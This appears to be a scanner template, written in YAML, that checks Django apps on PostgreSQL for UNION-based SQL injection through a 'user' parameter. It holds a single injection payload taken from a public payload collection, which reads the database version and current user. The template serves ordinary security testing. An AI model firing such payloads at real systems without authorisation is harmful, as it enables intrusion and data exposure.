id: patt-sqli-pg-union-01-user
name: 'PATT sqli patt-sqli-pg-union-01 via user'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - python
  - django
description: 'PATT PG UNION with version()/current_user. [patt:patt-sqli-pg-union-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/PostgreSQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      user:
        - ''' UNION SELECT NULL,version(),current_user-- -'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
